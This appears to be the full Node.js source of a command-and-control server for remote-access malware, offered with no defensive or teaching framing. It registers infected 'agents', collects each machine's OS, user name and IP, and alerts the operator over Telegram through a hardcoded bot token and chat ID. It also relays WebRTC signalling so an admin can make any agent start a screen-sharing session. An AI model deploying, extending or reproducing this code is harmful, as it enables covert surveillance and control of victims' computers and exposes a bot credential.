const express = require('express');
const http = require('http');
const WebSocket = require('ws');
const { v4: uuidv4 } = require('uuid');
const path = require('path');
const fs = require('fs');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// --- CONFIGURATION ---
const TELEGRAM_TOKEN = '9054625238:AAG1uzL9kvH6XxHf1wb6Ga71ZVwheNkS54Y';
const TELEGRAM_CHAT_ID = '6172226452';

// In-memory Database
let knownUsers = {}; 
let clients = {}; 

// Telegram Spam Protection
const tgCooldown = {}; 
const TG_COOLDOWN_MS = 3 * 60 * 60 * 1000; 

// --- HELPER FUNCTIONS ---

function logToFile(msg) {
 const timestamp = new Date().toISOString();
 const line = `[${timestamp}] ${msg}`;
 console.log(line);
 broadcastLogToAdmins(line);
}

function notifyTelegram(msg) {
 const userIdMatch = msg.match(/ID:\s*(\w+)/);
 const cooldownKey = userIdMatch ? userIdMatch[1] : 'global_tg_alert';
 
 const now = Date.now();
 if (tgCooldown[cooldownKey] && (now - tgCooldown[cooldownKey]) < TG_COOLDOWN_MS) {
 return; 
 }
 
 tgCooldown[cooldownKey] = now;

 const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage?chat_id=${TELEGRAM_CHAT_ID}&text=${encodeURIComponent(msg)}`;
 require('https').get(url, (res) => {
 let data = '';
 res.on('data', (chunk) => { data += chunk; });
 res.on('end', () => {
 if (res.statusCode !== 200) {
 logToFile(`[TG ERROR] Status: ${res.statusCode}, Body: ${data}`);
 }
 });
 }).on('error', (e) => {
 logToFile(`[TG ERROR] ${e.message}`);
 });
}

function notifyAdmin(id, msg) {
 wss.clients.forEach(client => {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 client.send(JSON.stringify({ targetId: id, type: 'alert', message: msg }));
 }
 });
}

function broadcastToAdmin(sourceId, data) {
 wss.clients.forEach(client => {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 client.send(JSON.stringify({ targetId: sourceId, ...data }));
 }
 });
}

function broadcastLogToAdmins(line) {
 wss.clients.forEach(client => {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 client.send(JSON.stringify({ type: 'system_log', message: line }));
 }
 });
}

// --- HTTP ROUTING ---
app.use(express.static(__dirname)); 

app.get('/', (req, res) => {
 res.redirect('/admin.html');
});

app.get('/health', (req, res) => {
 res.writeHead(200, { 'Content-Type': 'text/plain' });
 res.end('OK');
});

// --- WEBSOCKET HANDLING ---
wss.on('connection', (ws, req) => {
 let id = uuidv4().substr(0, 8);
 ws.id = id;
 // FIX: Set isAdmin directly on the WebSocket instance
 ws.isAdmin = false;
 clients[id] = { ws, info: {}, lastSeen: Date.now(), isAdmin: false };

 logToFile(`[+] Client Connected: ${id}`);
 ws.send(JSON.stringify({ type: 'registered', id: id }));

 let pingInterval = setInterval(() => {
 if (ws.readyState === WebSocket.OPEN) {
 ws.ping();
 } else {
 clearInterval(pingInterval);
 }
 }, 25000);

 ws.on('message', (msgRaw) => {
 try {
 const data = JSON.parse(msgRaw);
 logToFile(`[MSG] Received from ${id}: ${data.type}`);

 // 1. Admin Registration
 if (data.type === 'register_admin') {
 // FIX: Set on both the wrapper and the instance
 clients[id].isAdmin = true;
 ws.isAdmin = true; 
 logToFile(`[ADMIN] Connected with ID: ${id}`);
 Object.keys(knownUsers).forEach(uid => {
 ws.send(JSON.stringify({ 
 type: 'info', 
 id: uid, 
 os: knownUsers[uid].info.os, 
 user: knownUsers[uid].info.user, 
 ip: knownUsers[uid].info.ip 
 }));
 });
 return;
 }

 // 2. Agent Info Packet
 if (data.type === 'info') {
 clients[id].info = data;
 clients[id].lastSeen = Date.now();
 knownUsers[id] = { 
 info: data, 
 lastSeen: Date.now(), 
 status: 'Online' 
 };
 notifyAdmin(id, `🟢 New User: ${data.os || 'Unknown'} (${data.user || 'Unknown'})`);
 broadcastToAdmin(id, data);
 notifyTelegram(`🛡️ NEW AGENT CONNECTED\nID: ${id}\nOS: ${data.os || 'Unknown'}\nUser: ${data.user || 'Unknown'}\nIP: ${data.ip || 'Unknown'}`);
 } 
 // 3. Heartbeat
 else if (data.type === 'heartbeat') {
 clients[id].lastSeen = Date.now();
 if (knownUsers[id]) {
 knownUsers[id].lastSeen = Date.now();
 knownUsers[id].status = 'Online';
 }
 } 
 // 4. WebRTC Signaling
 else if (['offer', 'answer', 'candidate'].includes(data.type)) {
 // If Agent sends Offer -> Forward to Admin
 if (!ws.isAdmin && data.targetId === 'admin') {
 wss.clients.forEach(client => {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 client.send(JSON.stringify({ 
 type: data.type, 
 targetId: id, 
 sdp: data.sdp,
 candidate: data.candidate
 }));
 }
 });
 }
 // If Admin sends Offer -> Forward to specific Agent
 else if (ws.isAdmin && data.targetId) {
 if (clients[data.targetId]) {
 const targetWs = clients[data.targetId].ws;
 if (targetWs.readyState === WebSocket.OPEN) {
 targetWs.send(JSON.stringify(data));
 }
 }
 }
 // If Agent sends Answer -> Forward to Admin
 else if (!ws.isAdmin && data.targetId === 'admin') {
 wss.clients.forEach(client => {
 if (client.readyState === WebSocket.OPEN && client.isAdmin) {
 client.send(JSON.stringify({ 
 type: data.type, 
 targetId: id, 
 sdp: data.sdp,
 candidate: data.candidate
 }));
 }
 });
 }
 // Fallback: Agent to Agent
 else if (data.targetId && clients[data.targetId]) {
 const targetWs = clients[data.targetId].ws;
 if (targetWs.readyState === WebSocket.OPEN) {
 targetWs.send(JSON.stringify(data));
 }
 }
 } 
 // 5. Join All (Broadcast)
 else if (data.type === 'join_all') {
 Object.keys(clients).forEach(cid => {
 if (cid !== id && clients[cid].ws.readyState === WebSocket.OPEN) {
 clients[cid].ws.send(JSON.stringify({
 type: 'join_request',
 from: id,
 timestamp: Date.now()
 }));
 }
 });
 } 
 // 6. Admin Request Join (FIXED)
 else if (data.type === 'request_join') {
 const targetId = data.targetId;
 if (clients[targetId]) {
 // Send a specific 'start_join' signal to force the agent to initiate the offer
 clients[targetId].ws.send(JSON.stringify({
 type: 'start_join',
 from: id, 
 timestamp: Date.now()
 }));
 logToFile(`[ADMIN] Requested join to ${targetId}`);
 }
 }
 // Generic Fallback
 else {
 if (!clients[id].info && !clients[id].isAdmin) {
 knownUsers[id] = knownUsers[id] || {};
 knownUsers[id].info = knownUsers[id].info || { os: 'Unknown', user: 'Unknown', ip: 'Unknown' };
 notifyAdmin(id, `📺 Screen Active: ${id}`);
 }
 broadcastToAdmin(id, data);
 }
 } catch (e) {
 logToFile(`[ERR] Message parsing error from ${id}: ${e.message}`);
 }
 });

 ws.on('close', () => {
 delete clients[id];
 if (knownUsers[id]) {
 knownUsers[id].status = 'Offline';
 knownUsers[id].lastSeen = Date.now();
 }
 notifyAdmin(id, '🔴 User Disconnected');
 notifyTelegram(`🔴 AGENT DISCONNECTED\nID: ${id}`);
 logToFile(`[-] Client Disconnected: ${id}`);
 });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
 logToFile(`C2 Server running on port ${PORT}`);
});
